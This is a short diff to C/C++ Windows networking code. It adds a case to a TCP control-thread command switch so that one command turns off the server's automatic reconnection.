@@ -817,6 +817,9 @@ DWORD WINAPI tcp_controle_thread(LPVOID lpParam)
 					case 8:
 						reverse_connection(server,3,1);
 						break;
+					case 9:
+						server->AutoReconnect(false);
+						break;
 				}
 			}
 		}
